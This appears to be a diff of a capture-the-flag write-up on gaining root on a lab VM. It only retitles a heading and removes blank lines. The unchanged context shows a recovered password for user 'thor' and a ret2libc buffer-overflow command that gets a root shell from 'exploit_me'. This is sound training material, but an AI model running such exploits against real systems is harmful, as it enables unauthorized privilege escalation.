@@ -1,4 +1,4 @@
-# Root privilege escalation - Method 1
+# Root privilege escalation - Method 1 - Root hunt game
 
 ## Get VM IP
 
@@ -474,7 +474,6 @@ We can now login as thor:
 `su thor`
 `> Password: Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
-
 ## SSH thor - Break turtle file
 
 We have a file called turtle, with some weird instructions:
@@ -516,7 +515,6 @@ Now we can use a ret2libc:
 `./exploit_me $(python -c 'print "A" * 140 + "\x60\xb0\xe6\xb7" + "A" *4 + "\x58\xcc\xf8\xb7"')`
 `# whoami`
 `root`
-
 
 ---
 
